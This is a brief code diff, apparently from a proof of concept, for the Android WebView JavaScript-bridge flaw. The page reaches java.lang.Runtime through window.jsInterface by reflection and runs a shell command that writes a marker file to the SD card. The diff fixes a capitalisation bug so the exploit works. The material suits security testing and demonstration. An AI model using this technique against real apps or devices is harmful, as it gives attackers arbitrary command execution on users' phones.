@@ -4,7 +4,7 @@
 			document.write(window.jsInterface.getSomething());
 			
 			function execute(cmd){
-  				return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
+  				return window.jsInterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
 			}
 			
 			execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
